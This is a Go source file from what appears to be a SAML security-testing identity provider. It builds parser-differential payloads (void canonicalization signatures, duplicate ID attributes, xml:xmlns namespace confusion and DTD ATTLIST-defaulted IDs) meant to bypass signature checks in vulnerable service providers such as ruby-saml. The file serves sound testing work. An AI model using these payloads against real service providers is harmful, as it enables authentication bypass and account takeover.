package saml

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"slices"
	"strings"

	"github.com/beevik/etree"
)

// Parser differential attacks. Each one emits a document that an SP's
// signature-validating parser and its claim-reading parser read differently, so
// the SP verifies one element and then trusts the claims of another. Published
// as "The Fragile Lock" (Zakhar Fedotkin, PortSwigger, 2025) and tracked for
// ruby-saml as CVE-2025-66568 and CVE-2025-66567, both fixed in 1.18.0.
//
// The published exploit chain needs a legitimately signed donor document,
// because the attacker there cannot sign. Plasmid is the IdP, so it skips the
// donor and emits the malformed structure directly, signing whatever the attack
// needs signed. That makes each mode a single-request probe of the parser bug
// itself rather than a reproduction of the whole chain.
const (
	ParserDiffOff = ""
	// ParserDiffVoidC14N hand-builds the signature over the empty string and
	// declares a relative namespace URI. libxml2 refuses to canonicalize a
	// document containing one, and a vulnerable implementation treats the
	// failure as an empty canonical form, so both the digest and the signature
	// cover nothing at all. It signs with the real IdP key so that the SP's
	// configured certificate matches and canonicalization is the only thing
	// under test.
	ParserDiffVoidC14N = "void_c14n"
	// ParserDiffAttrPollution carries the signed ID under several qualified
	// names at once. libxml2 looks attributes up by local name and ignores the
	// prefix, REXML does not, so the two resolve the same @ID query to
	// different elements.
	ParserDiffAttrPollution = "attr_pollution"
	// ParserDiffNSConfusion hides a signature behind xml:xmlns, which libxml2
	// treats as an ordinary attribute and REXML treats as a namespace
	// redefinition. The two parsers then disagree about which elements are
	// ds:Signature at all.
	ParserDiffNSConfusion = "ns_confusion"
	// ParserDiffDTDAttlist supplies the Response ID through an ATTLIST default
	// instead of a literal attribute, so only a parser that applies DTD
	// attribute defaults sees it. It prepends a DOCTYPE, which the XXE mode
	// also does, and a document may carry only one.
	ParserDiffDTDAttlist = "dtd_attlist"
)

// void_c14n is the only offered mode. Against ruby-saml 1.12.4 with nokogiri
// 1.18.10 / libxml2 2.13.9, the other three payloads are rejected before the
// parser differential is reached:
//
//   - attr_pollution and ns_confusion add attributes or children to the element
//     the response signature covers, so the digest stops matching. The published
//     attack borrows a signature over a different document; signing honestly and
//     then rewriting the signed element cannot work. They need a shape where the
//     polluted element is not the signed one.
//   - dtd_attlist is invisible to the target: ruby-saml parses with STRICT|NONET
//     and never applies DTD attribute defaults, so neither parser sees the ID.
//
// Their builders stay out of the offered set until a real implementation
// accepts them, and are reachable through applyWith for that work.

// emptyStringDigestB64 is the base64 SHA-256 of zero bytes. A vulnerable
// implementation that canonicalized nothing computes exactly this, so it is
// what the void signature has to claim.
var emptyStringDigestB64 = func() string {
	sum := sha256.Sum256(nil)
	return base64.StdEncoding.EncodeToString(sum[:])
}()

type parserDiffSpec struct {
	mode        string
	label       string
	help        string
	usesDoctype bool
	// validated records that this payload has been shown to bypass a real
	// vulnerable implementation and to be rejected by a patched one. Only
	// validated modes are offered. A payload that merely looks right is worse
	// than nothing: a rejection from the SP would be indistinguishable from the
	// SP being secure, which is the one answer the operator cannot act on.
	validated bool
	build     func(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error)
}

// parserDiffSpecs is the single registration point for the modes: the ordering
// slice, the label map and the help map are all derived from it, so a mode
// cannot be half-added.
var parserDiffSpecs = []parserDiffSpec{
	{
		mode:      ParserDiffVoidC14N,
		label:     "void canonicalization (digest and signature over the empty string)",
		help:      "Signs the empty string with the real IdP key and declares a relative namespace URI so canonicalization fails document-wide. An SP that treats the failure as an empty canonical form accepts any claims you override.",
		validated: true,
		build:     buildVoidC14N,
	},
	{
		mode:  ParserDiffAttrPollution,
		label: "attribute pollution (duplicate namespaced ID attributes)",
		help:  "Carries the signed ID as both a prefixed and an unprefixed attribute. An SP whose signature check resolves @ID namespace-agnostically and whose claim reader does not will validate one element and trust another.",
		build: buildAttrPollution,
	},
	{
		mode:  ParserDiffNSConfusion,
		label: "namespace confusion (xml:xmlns redefinition)",
		help:  "Wraps a decoy signature in elements that redefine the XML-Signature namespace through xml:xmlns, which is an ordinary attribute to libxml2 and a namespace declaration to REXML.",
		build: buildNSConfusion,
	},
	{
		mode:        ParserDiffDTDAttlist,
		label:       "DTD-defaulted ID via <!ATTLIST> (needs DTD processing)",
		help:        "Removes the Response ID attribute and supplies it as a DTD default instead, so only a parser that applies ATTLIST defaults can see it. Prepends a DOCTYPE, so the XXE mode is skipped when this one is active.",
		usesDoctype: true,
		build:       buildDTDAttlist,
	},
}

// ParserDiffModes lists the modes in the order the tamper page offers them.
var ParserDiffModes = func() []string {
	var modes []string
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			modes = append(modes, spec.mode)
		}
	}
	return modes
}()

// ParserDiffModeLabels are the human-readable names shown in the UI and
// recorded in the inspector.
var ParserDiffModeLabels = func() map[string]string {
	labels := map[string]string{}
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			labels[spec.mode] = spec.label
		}
	}
	return labels
}()

// ParserDiffModeHelp explains, per mode, what accepting it would mean.
var ParserDiffModeHelp = func() map[string]string {
	help := map[string]string{}
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			help[spec.mode] = spec.help
		}
	}
	return help
}()

func IsParserDiffMode(mode string) bool {
	_, ok := ParserDiffModeLabels[mode]
	return ok
}

// ParserDiffUsesDoctype reports whether a mode prepends a DOCTYPE. The XXE mode
// prepends one too and a document may only have one, so the transform has to
// drop one of them rather than emit both.
func ParserDiffUsesDoctype(mode string) bool {
	spec, ok := lookupParserDiffSpec(mode)
	return ok && spec.usesDoctype
}

func lookupParserDiffSpec(mode string) (parserDiffSpec, bool) {
	for _, spec := range parserDiffSpecs {
		if spec.mode == mode {
			return spec, true
		}
	}
	return parserDiffSpec{}, false
}

// parserDiffOptions holds the payload details that decide whether a given SP's
// parsers actually diverge. They are gathered here, rather than spread through
// the builders, because they are the knobs that get turned while testing a
// payload against a real implementation.
type parserDiffOptions struct {
	// void_c14n
	RelativeNSPrefix  string
	RelativeNSValue   string
	DeclareOnResponse bool
	DeclareOnSigned   bool

	// attr_pollution
	EmitPrefixedID  bool
	EmitXMLID       bool
	PrefixedIDFirst bool

	// ns_confusion
	DecoyOuterNS string
	DecoyInnerNS string
	ConcealTag   string
	RevealTag    string

	// dtd_attlist
	DoctypeAttr string
}

var defaultParserDiffOptions = parserDiffOptions{
	RelativeNSPrefix:  "plasmid",
	RelativeNSValue:   "1",
	DeclareOnResponse: true,
	DeclareOnSigned:   true,

	EmitPrefixedID:  true,
	EmitXMLID:       true,
	PrefixedIDFirst: true,

	DecoyOuterNS: dsNS,
	DecoyInnerNS: "http://www.w3.org/2000/09/xmldsig_#",
	ConcealTag:   "Conceal",
	RevealTag:    "Reveal",

	DoctypeAttr: "ID",
}

// ParserDiffer emits the parser-differential payloads. Unlike Resigner it holds
// the real IdP key rather than generating attacker material: void
// canonicalization only isolates the canonicalization bug if the certificate
// the SP was configured with is the one that signed. It caches nothing and
// keeps no mutable state, so it needs no lock.
type ParserDiffer struct {
	key  *rsa.PrivateKey
	cert *x509.Certificate
}

func NewParserDiffer(key *rsa.PrivateKey, cert *x509.Certificate) *ParserDiffer {
	return &ParserDiffer{key: key, cert: cert}
}

// Apply rewrites a SAML response into the shape the mode calls for and returns
// the new XML plus a description of what it did.
func (p *ParserDiffer) Apply(xmlBytes []byte, mode string) ([]byte, string, error) {
	if !IsParserDiffMode(mode) {
		return nil, "", fmt.Errorf("unknown parser differential mode %q", mode)
	}
	return p.applyWith(xmlBytes, mode, defaultParserDiffOptions)
}

// applyWith is Apply with the payload knobs supplied explicitly. It exists so
// that payload shapes can be swept against a real implementation without
// rebuilding the defaults.
func (p *ParserDiffer) applyWith(xmlBytes []byte, mode string, opt parserDiffOptions) ([]byte, string, error) {
	spec, ok := lookupParserDiffSpec(mode)
	if !ok {
		return nil, "", fmt.Errorf("unknown parser differential mode %q", mode)
	}
	if p == nil || p.key == nil || p.cert == nil {
		return nil, "", fmt.Errorf("parser differential mode %q needs the IdP key and certificate", mode)
	}

	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(xmlBytes); err != nil {
		return nil, "", fmt.Errorf("parse failed: %w", err)
	}
	if doc.Root() == nil {
		return nil, "", fmt.Errorf("no root element")
	}

	detail, err := spec.build(doc, p, opt)
	if err != nil {
		return nil, "", err
	}

	out, err := doc.WriteToBytes()
	if err != nil {
		return nil, "", fmt.Errorf("serialize failed: %w", err)
	}

	desc := spec.label
	if detail != "" {
		desc += " (" + detail + ")"
	}
	return out, desc, nil
}

func buildVoidC14N(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
	response := doc.Root()
	targets := signatureTargets(response)
	if len(targets) == 0 {
		return "", fmt.Errorf("void_c14n: response carries no signature to replace")
	}

	for _, el := range targets {
		if err := voidifySignature(el, p.key, p.cert); err != nil {
			return "", err
		}
		if opt.DeclareOnSigned {
			declareNS(el, opt.RelativeNSPrefix, opt.RelativeNSValue)
		}
	}
	if opt.DeclareOnResponse {
		declareNS(response, opt.RelativeNSPrefix, opt.RelativeNSValue)
	}

	return fmt.Sprintf("xmlns:%s=%q, digest %s…", opt.RelativeNSPrefix, opt.RelativeNSValue, emptyStringDigestB64[:12]), nil
}

// voidifySignature replaces an element's signature with one whose digest and
// signature value both cover the empty string.
func voidifySignature(el *etree.Element, key *rsa.PrivateKey, cert *x509.Certificate) error {
	id := el.SelectAttrValue("ID", "")
	if id == "" {
		return fmt.Errorf("void_c14n: %s has no ID to reference", el.Tag)
	}

	removeSignature(el)
	sig, err := voidSignature(id, key, cert)
	if err != nil {
		return err
	}
	// Same reason as the resigner: a schema-validating SP rejects a signature
	// anywhere but directly after Issuer, before it ever checks the signature.
	el.InsertChildAt(issuerIndex(el), sig)
	return nil
}

// voidSignature builds a ds:Signature identical to the one goxmldsig emits for
// an enveloped RSA-SHA256 signature, except that the digest is the hash of the
// empty string and the signature value covers the empty string rather than the
// canonicalized SignedInfo. Keeping the rest byte-identical means an SP that
// rejects this is rejecting the void canonicalization, not the shape.
func voidSignature(refID string, key *rsa.PrivateKey, cert *x509.Certificate) (*etree.Element, error) {
	sigValue, err := signEmptyString(key)
	if err != nil {
		return nil, err
	}

	sig := etree.NewElement("ds:Signature")
	sig.CreateAttr("xmlns:ds", dsNS)

	signedInfo := sig.CreateElement("ds:SignedInfo")
	signedInfo.CreateElement("ds:CanonicalizationMethod").CreateAttr("Algorithm", "http://www.w3.org/2001/10/xml-exc-c14n#")
	signedInfo.CreateElement("ds:SignatureMethod").CreateAttr("Algorithm", "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256")

	ref := signedInfo.CreateElement("ds:Reference")
	ref.CreateAttr("URI", "#"+refID)
	transforms := ref.CreateElement("ds:Transforms")
	transforms.CreateElement("ds:Transform").CreateAttr("Algorithm", "http://www.w3.org/2000/09/xmldsig#enveloped-signature")
	transforms.CreateElement("ds:Transform").CreateAttr("Algorithm", "http://www.w3.org/2001/10/xml-exc-c14n#")
	ref.CreateElement("ds:DigestMethod").CreateAttr("Algorithm", "http://www.w3.org/2001/04/xmlenc#sha256")
	ref.CreateElement("ds:DigestValue").SetText(emptyStringDigestB64)

	sig.CreateElement("ds:SignatureValue").SetText(sigValue)

	keyInfo := sig.CreateElement("ds:KeyInfo")
	x509Data := keyInfo.CreateElement("ds:X509Data")
	x509Data.CreateElement("ds:X509Certificate").SetText(base64.StdEncoding.EncodeToString(cert.Raw))

	return sig, nil
}

// signEmptyString signs zero bytes. PKCS#1 v1.5 is deterministic, so repeated
// probes present byte-identical signatures and results stay comparable.
func signEmptyString(key *rsa.PrivateKey) (string, error) {
	sum := sha256.Sum256(nil)
	sig, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, sum[:])
	if err != nil {
		return "", fmt.Errorf("sign empty string: %w", err)
	}
	return base64.StdEncoding.EncodeToString(sig), nil
}

// declareNS adds a namespace declaration, replacing any existing one for the
// same prefix.
func declareNS(el *etree.Element, prefix, value string) {
	el.CreateAttr("xmlns:"+prefix, value)
}

// signatureTargets returns the elements carrying a signature, mirroring what
// the resigner treats: whichever of the response and the assertion are signed,
// so the SP cannot fall back to the other.
func signatureTargets(response *etree.Element) []*etree.Element {
	var targets []*etree.Element
	if findSignature(response) != nil {
		targets = append(targets, response)
	}
	if assertion := findElement(response, "saml", "Assertion"); assertion != nil && findSignature(assertion) != nil {
		targets = append(targets, assertion)
	}
	return targets
}

// signedElementID reads the ID the signature actually covers, from the
// Reference URI rather than from the element's own ID attribute. The pollution
// and DTD modes have to name that element, and reading it back from the
// signature keeps working after the resigner has rebuilt one.
func signedElementID(el *etree.Element) (string, error) {
	sig := findSignature(el)
	if sig == nil {
		return "", fmt.Errorf("%s carries no signature", el.Tag)
	}
	signedInfo := findElement(sig, "ds", "SignedInfo")
	if signedInfo == nil {
		return "", fmt.Errorf("%s signature has no SignedInfo", el.Tag)
	}
	ref := findElement(signedInfo, "ds", "Reference")
	if ref == nil {
		return "", fmt.Errorf("%s signature has no Reference", el.Tag)
	}
	uri := ref.SelectAttrValue("URI", "")
	if !strings.HasPrefix(uri, "#") || len(uri) < 2 {
		return "", fmt.Errorf("%s signature Reference URI %q is not a local ID", el.Tag, uri)
	}
	return uri[1:], nil
}

// attrIndex reports where an attribute sits in the element's attribute list, or
// -1. Position matters: libxml2 resolves an unqualified @ID lookup to the first
// attribute whose local name matches, whatever its prefix.
func attrIndex(el *etree.Element, space, key string) int {
	return slices.IndexFunc(el.Attr, func(a etree.Attr) bool {
		return a.Space == space && a.Key == key
	})
}

func insertAttrAt(el *etree.Element, index int, space, key, value string) {
	if index < 0 || index > len(el.Attr) {
		index = len(el.Attr)
	}
	el.Attr = slices.Insert(el.Attr, index, etree.Attr{Space: space, Key: key, Value: value})
}

func buildAttrPollution(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
	response := doc.Root()
	signedID, err := signedElementID(response)
	if err != nil {
		return "", fmt.Errorf("attr_pollution: %w", err)
	}

	// etree keeps only the last of two attributes with the same literal
	// qualified name when it reads a document back, so the duplicates have to
	// differ by prefix. That is what the published payload does too.
	at := attrIndex(response, "", "ID")
	if at < 0 {
		return "", fmt.Errorf("attr_pollution: response has no ID attribute")
	}

	var added []string
	insertBefore := at
	if !opt.PrefixedIDFirst {
		insertBefore = at + 1
	}

	if opt.EmitXMLID {
		insertAttrAt(response, insertBefore, "xml", "ID", signedID)
		added = append(added, "xml:ID")
		insertBefore++
	}
	if opt.EmitPrefixedID && response.Space != "" {
		insertAttrAt(response, insertBefore, response.Space, "ID", signedID)
		added = append(added, response.Space+":ID")
	}
	if len(added) == 0 {
		return "", fmt.Errorf("attr_pollution: no duplicate ID variant selected")
	}

	order := "after ID"
	if opt.PrefixedIDFirst {
		order = "before ID"
	}
	return fmt.Sprintf("%s %s, all = %q", strings.Join(added, " + "), order, signedID), nil
}

func buildNSConfusion(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
	response := doc.Root()
	sig := findSignature(response)
	if sig == nil {
		return "", fmt.Errorf("ns_confusion: response carries no signature to copy")
	}

	statusDetail, err := statusDetailFor(response)
	if err != nil {
		return "", err
	}

	// Conceal declares the real XML-Signature namespace the ordinary way, so a
	// namespace-aware parser sees a ds:Signature inside. Reveal redeclares it
	// through xml:xmlns, which only REXML honours, so the two parsers disagree
	// about whether the decoy is a signature at all.
	conceal := statusDetail.CreateElement(opt.ConcealTag)
	conceal.CreateAttr("xmlns", opt.DecoyOuterNS)
	reveal := conceal.CreateElement(opt.RevealTag)
	reveal.CreateAttr("xml:xmlns", opt.DecoyInnerNS)

	decoy := reveal.CreateElement("Signature")
	for _, child := range sig.ChildElements() {
		copied := child.Copy()
		copied.Space = ""
		decoy.AddChild(copied)
	}

	return fmt.Sprintf("decoy signature under %s/%s, xml:xmlns=%q", opt.ConcealTag, opt.RevealTag, opt.DecoyInnerNS), nil
}

// statusDetailFor returns a samlp:StatusDetail to hide a decoy in, creating it
// if the response has none. StatusDetail and Extensions are the only two
// elements the schema allows before the Signature, which is what makes them the
// injection points.
func statusDetailFor(response *etree.Element) (*etree.Element, error) {
	status := findElement(response, response.Space, "Status")
	if status == nil {
		return nil, fmt.Errorf("ns_confusion: response has no Status element to extend")
	}
	prefix := ""
	if response.Space != "" {
		prefix = response.Space + ":"
	}
	if detail := findElement(status, response.Space, "StatusDetail"); detail != nil {
		return detail, nil
	}
	return status.CreateElement(prefix + "StatusDetail"), nil
}

func buildDTDAttlist(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
	response := doc.Root()
	signedID, err := signedElementID(response)
	if err != nil {
		return "", fmt.Errorf("dtd_attlist: %w", err)
	}

	// The literal attribute has to go: the point is that only a parser applying
	// DTD defaults can see the ID at all.
	response.RemoveAttr(opt.DoctypeAttr)

	qname := response.Tag
	if response.Space != "" {
		qname = response.Space + ":" + response.Tag
	}
	prependDoctype(doc, attlistDoctype(qname, opt.DoctypeAttr, signedID))

	return fmt.Sprintf("%s %s defaulted to %q via ATTLIST", qname, opt.DoctypeAttr, signedID), nil
}

func attlistDoctype(rootQName, attr, value string) string {
	return fmt.Sprintf("DOCTYPE %s [\n<!ATTLIST %s %s CDATA #FIXED %q>\n]", rootQName, rootQName, attr, value)
}

// prependDoctype inserts a DOCTYPE immediately before the root element. etree
// writes directive data verbatim, so the ATTLIST survives unescaped.
func prependDoctype(doc *etree.Document, data string) {
	doc.InsertChildAt(rootIndex(doc), etree.NewDirective(data))
}

func rootIndex(doc *etree.Document) int {
	for i, child := range doc.Child {
		if _, ok := child.(*etree.Element); ok {
			return i
		}
	}
	return len(doc.Child)
}
